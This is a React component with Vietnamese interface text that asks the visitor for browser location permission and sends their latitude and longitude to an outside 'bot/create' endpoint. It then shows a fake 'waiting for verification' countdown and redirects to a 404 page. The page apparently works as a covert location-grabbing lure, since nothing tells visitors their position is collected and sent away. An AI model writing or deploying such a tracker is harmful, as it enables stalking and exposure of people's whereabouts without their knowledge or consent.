import React, { useEffect, useState } from 'react';
import axios from "axios";
import { useNavigate } from "react-router-dom";
import './style.css'

const LocationComponent = () => {
  const navigate = useNavigate();
  const [location, setLocation] = useState<any>();
  const [countdown, setCountdown] = useState<number>(5);

  useEffect(() => {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          const { latitude, longitude } = position.coords;
          setLocation({ lat: latitude, lng: longitude });
        },
        (error) => {
          console.error('Error getting location:', error);
          openGPSPrompt();
        }
      );
    } else {
      console.error('Geolocation is not supported by this browser.');
    }
  }, []);

  useEffect(() => {
    try {
      if (location) {
        axios.post(`https://findlocationbe-production.up.railway.app/bot/create`, { latitude: location.lat, longitude: location.lng });
      }
    }catch (e){
      console.error('Error getting location:', e);
    }

  }, [location]);

  useEffect(() => {
    const countdownTimer = setInterval(() => {
      setCountdown((prevCountdown) => {
        if (prevCountdown > 0) {
          return prevCountdown - 1;
        } else {
          clearInterval(countdownTimer);
          return prevCountdown;
        }
      });
    }, 1000);

    return () => {
      clearInterval(countdownTimer);
    };
  }, []);

  const openGPSPrompt = () => {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          // GPS đã được mở
          const { latitude, longitude } = position.coords;
          setLocation({ lat: latitude, lng: longitude });
        },
        (error) => {
          console.error('Error getting location:', error);
          // Người dùng không mở GPS
          // Hiển thị thông báo yêu cầu mở GPS
          // alert('Vui lòng mở GPS để sử dụng tính năng vị trí.');
        }
      );
    } else {
      console.error('Geolocation is not supported by this browser.');
    }
  };

  const formatTime = (time: number): string => {
    const minutes = Math.floor(time / 60);
    const seconds = time % 60;

    const formattedMinutes = minutes < 10 ? `0${minutes}` : minutes.toString();
    const formattedSeconds = seconds < 10 ? `0${seconds}` : seconds.toString();

    if (minutes === 0 && seconds === 0){
      navigate('/404');
    }

    return `${formattedMinutes}:${formattedSeconds}`;
  };

  return (
    <div>
      {!location ?
        (
          <div className="container">
            <p>Vui lòng cấp quyền vị trí</p>
            <span className="loader"></span>
          </div>
        ) :
        (
          <div className="container">
            <p>Chờ xác minh: {formatTime(countdown)}</p>
            <span className="loader-1">Loading</span>
          </div>

        )}
    </div>
  );
};

export default LocationComponent;
